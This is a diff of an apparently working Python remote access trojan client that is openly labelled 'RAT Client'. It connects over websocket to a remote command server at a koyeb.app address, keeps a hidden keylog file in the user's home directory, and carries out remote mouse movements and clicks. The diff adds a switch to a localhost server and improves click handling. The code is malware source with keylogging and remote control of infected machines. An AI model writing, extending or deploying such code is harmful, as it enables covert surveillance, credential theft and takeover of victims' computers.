@@ -1,3 +1,4 @@
+import argparse
 import asyncio
 import base64
 import io
@@ -22,7 +23,6 @@ import websockets
 from PIL import Image
 
 # --- Konfiguration & Globals ---
-SERVER_URI = os.getenv("SERVER_URI", "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app/rat")
 KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
 CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")
 HEARTBEAT_INTERVAL = 45  # Sekunden
@@ -691,6 +691,10 @@ async def process_commands(websocket: websockets.ClientConnection):
                 if event_type == "move":
                     pyautogui.moveTo(event_data.get("x"), event_data.get("y"))
                 elif event_type == "click":
+                    x = event_data.get("x")
+                    y = event_data.get("y")
+                    if x is not None and y is not None:
+                        pyautogui.moveTo(x, y)
                     pyautogui.click(
                         button=event_data.get("button", "left"),
                         clicks=event_data.get("clicks", 1)
@@ -753,7 +757,15 @@ async def connect_to_server():
         backoff_time = min(backoff_time * 2, 300)
 
 if __name__ == "__main__":
-    # Check for the "idontwantviruspls" directory in Program Files
+    parser = argparse.ArgumentParser(description="RAT Client")
+    parser.add_argument('--local', action='store_true', help='Connect to localhost server instead of remote')
+    args = parser.parse_args()
+
+    if args.local:
+        SERVER_URI = "ws://127.0.0.1:8000/rat"
+    else:
+        SERVER_URI = os.getenv("SERVER_URI", "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app/rat")
+
     program_files_path = os.environ.get("PROGRAMFILES")
     if program_files_path:
         target_dir = os.path.join(program_files_path, "idontwantviruspls")
